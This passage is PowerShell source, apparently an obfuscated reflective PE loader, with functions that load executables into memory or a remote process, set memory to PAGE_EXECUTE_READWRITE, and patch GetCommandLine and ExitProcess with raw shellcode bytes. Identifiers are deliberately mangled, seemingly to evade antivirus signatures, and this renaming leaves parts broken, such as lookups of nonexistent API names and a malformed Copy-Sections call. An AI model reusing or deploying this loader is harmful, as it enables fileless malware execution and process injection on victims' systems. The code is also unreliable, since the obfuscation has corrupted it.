		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$PC32T_Y_P_E_S
		)
		
		for( $i = 0; $i -lt $Info_of_PE.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$Info_of_PE.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PC32T_Y_P_E_S.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$PC32T_Y_P_E_S.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-S1gn3dlntAsUn51gn3d ($Info_of_PE.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -Info_of_PE $Info_of_PE -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $PC32_functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	


	
	


	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PC32_functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$PC32_non_variables
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $PC32_functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$PC32_non_variables.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$PC32_functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$PC32_functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}





	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$PC32T_Y_P_E_S = Get-PC32T_Y_P_E_S
		$PC32_non_variables = Get-PC32_non_variables
		$Info_of_PE = Get-PEDetailedInfo -PEHandle $PEHandle -PC32T_Y_P_E_S $PC32T_Y_P_E_S -PC32_non_variables $PC32_non_variables
		

		if ($Info_of_PE.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-S1gn3dlntAsUn51gn3d ($PEHandle) ($Info_of_PE.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$PC32T_Y_P_E_S.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{

			$NameOffsetPtr = Add-S1gn3dlntAsUn51gn3d ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-S1gn3dlntAsUn51gn3d ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{


				$OrdinalPtr = Add-S1gn3dlntAsUn51gn3d ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-S1gn3dlntAsUn51gn3d ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-S1gn3dlntAsUn51gn3d ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$Info_of_PE,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PC32_functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$PC32_non_variables,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		

		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $PC32_functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $PC32_functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}




		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$G3tC0mm4ndL1neAAddr = $PC32_functions.GetProcAddress.Invoke($KernelBaseHandle, "G3tC0mm4ndL1neA")
		[IntPtr]$G3tC0mm4ndL1neWAddr = $PC32_functions.GetProcAddress.Invoke($KernelBaseHandle, "G3tC0mm4ndL1neW")

		if ($G3tC0mm4ndL1neAAddr -eq [IntPtr]::Zero -or $G3tC0mm4ndL1neWAddr -eq [IntPtr]::Zero)
		{
			throw "G3tC0mm4ndL1ne ptr null. G3tC0mm4ndL1neA: $G3tC0mm4ndL1neAAddr. G3tC0mm4ndL1neW: $G3tC0mm4ndL1neWAddr"
		}


		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		

		$G3tC0mm4ndL1neAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$G3tC0mm4ndL1neWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$PC32_functions.memcpy.Invoke($G3tC0mm4ndL1neAOrigBytesPtr, $G3tC0mm4ndL1neAAddr, [UInt64]$TotalSize) | Out-Null
		$PC32_functions.memcpy.Invoke($G3tC0mm4ndL1neWOrigBytesPtr, $G3tC0mm4ndL1neWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($G3tC0mm4ndL1neAAddr, $G3tC0mm4ndL1neAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($G3tC0mm4ndL1neWAddr, $G3tC0mm4ndL1neWOrigBytesPtr, $TotalSize)


		[UInt32]$OldProtectFlag = 0
		$Success = $PC32_functions.VirtualProtect.Invoke($G3tC0mm4ndL1neAAddr, [UInt32]$TotalSize, [UInt32]($PC32_non_variables.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$G3tC0mm4ndL1neAAddrTemp = $G3tC0mm4ndL1neAAddr
		Write-MemFromBytes -Bytes $Shellcode1 -MemoryAddress $G3tC0mm4ndL1neAAddrTemp
		$G3tC0mm4ndL1neAAddrTemp = Add-S1gn3dlntAsUn51gn3d $G3tC0mm4ndL1neAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $G3tC0mm4ndL1neAAddrTemp, $false)
		$G3tC0mm4ndL1neAAddrTemp = Add-S1gn3dlntAsUn51gn3d $G3tC0mm4ndL1neAAddrTemp $PtrSize
		Write-MemFromBytes -Bytes $Shellcode2 -MemoryAddress $G3tC0mm4ndL1neAAddrTemp
		
		$PC32_functions.VirtualProtect.Invoke($G3tC0mm4ndL1neAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		

		[UInt32]$OldProtectFlag = 0
		$Success = $PC32_functions.VirtualProtect.Invoke($G3tC0mm4ndL1neWAddr, [UInt32]$TotalSize, [UInt32]($PC32_non_variables.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$G3tC0mm4ndL1neWAddrTemp = $G3tC0mm4ndL1neWAddr
		Write-MemFromBytes -Bytes $Shellcode1 -MemoryAddress $G3tC0mm4ndL1neWAddrTemp
		$G3tC0mm4ndL1neWAddrTemp = Add-S1gn3dlntAsUn51gn3d $G3tC0mm4ndL1neWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $G3tC0mm4ndL1neWAddrTemp, $false)
		$G3tC0mm4ndL1neWAddrTemp = Add-S1gn3dlntAsUn51gn3d $G3tC0mm4ndL1neWAddrTemp $PtrSize
		Write-MemFromBytes -Bytes $Shellcode2 -MemoryAddress $G3tC0mm4ndL1neWAddrTemp
		
		$PC32_functions.VirtualProtect.Invoke($G3tC0mm4ndL1neWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null

		
		





		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $PC32_functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $PC32_functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $PC32_functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				

				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $PC32_functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($PC32_non_variables.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$PC32_functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $PC32_functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($PC32_non_variables.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$PC32_functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}

		
		



		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		

		[IntPtr]$MscoreeHandle = $PC32_functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $PC32_functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		

		[IntPtr]$ExitProcessAddr = $PC32_functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr


			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)

			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $PC32_functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $PC32_functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$PC32_non_variables.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			

			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$PC32_functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			


			Write-MemFromBytes -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-S1gn3dlntAsUn51gn3d $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-S1gn3dlntAsUn51gn3d $ProcExitFunctionAddrTmp $PtrSize
			Write-MemFromBytes -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-S1gn3dlntAsUn51gn3d $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-S1gn3dlntAsUn51gn3d $ProcExitFunctionAddrTmp $PtrSize
			Write-MemFromBytes -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$PC32_functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}


		Write-Output $ReturnArray
	}
	



	Function Invoke-MemoryLib_Load
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$3x34rg5,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		

		$PC32_non_variables = Get-PC32_non_variables
		$PC32_functions = Get-Win32Functions
		$PC32T_Y_P_E_S = Get-PC32T_Y_P_E_S
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		

		Write-Verbose "Getting basic PE information from the file"
		$Info_of_PE = Get-PEBasicInfo -PEBytes $PEBytes -PC32T_Y_P_E_S $PC32T_Y_P_E_S
		$OriginalImageBase = $Info_of_PE.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $Info_of_PE.DllCharacteristics -band $PC32_non_variables.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $PC32_non_variables.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		

		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $PC32_functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $PC32_functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $PC32_functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			

			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $Info_of_PE.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		


		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (([Int] $Info_of_PE.DllCharacteristics -band $PC32_non_variables.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $PC32_non_variables.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{

			$PEHandle = $PC32_functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$Info_of_PE.SizeOfImage, $PC32_non_variables.MEM_COMMIT -bor $PC32_non_variables.MEM_RESERVE, $PC32_non_variables.PAGE_READWRITE)
			

			$EffectivePEHandle = $PC32_functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$Info_of_PE.SizeOfImage, $PC32_non_variables.MEM_COMMIT -bor $PC32_non_variables.MEM_RESERVE, $PC32_non_variables.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $PC32_functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$Info_of_PE.SizeOfImage, $PC32_non_variables.MEM_COMMIT -bor $PC32_non_variables.MEM_RESERVE, $PC32_non_variables.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $PC32_functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$Info_of_PE.SizeOfImage, $PC32_non_variables.MEM_COMMIT -bor $PC32_non_variables.MEM_RESERVE, $PC32_non_variables.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-S1gn3dlntAsUn51gn3d ($PEHandle) ([Int64]$Info_of_PE.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $Info_of_PE.SizeOfHeaders) | Out-Null
		
		

		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$Info_of_PE = Get-PEDetailedInfo -PEHandle $PEHandle -PC32T_Y_P_E_S $PC32T_Y_P_E_S -PC32_non_variables $PC32_non_variables
		$Info_of_PE | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$Info_of_PE | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		

		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -Info_of_PE $Info_of_PE -Win32Functions  #-Win32Functions -PC32T_Y_P_E_S $PC32T_Y_P_E_S
		
		

		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
